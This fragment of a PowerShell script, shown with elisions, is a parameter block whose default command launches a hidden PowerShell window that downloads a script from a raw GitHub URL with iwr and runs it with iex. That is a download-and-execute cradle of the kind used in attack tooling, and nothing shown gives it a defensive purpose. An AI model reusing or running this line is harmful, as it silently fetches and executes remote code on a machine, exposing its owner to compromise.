...
[CmdletBinding()]
	...
	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w h -c iex((iwr https://raw.githubusercontent.com/purmnr/LD/main/CMMD.ps1).content)'
	)
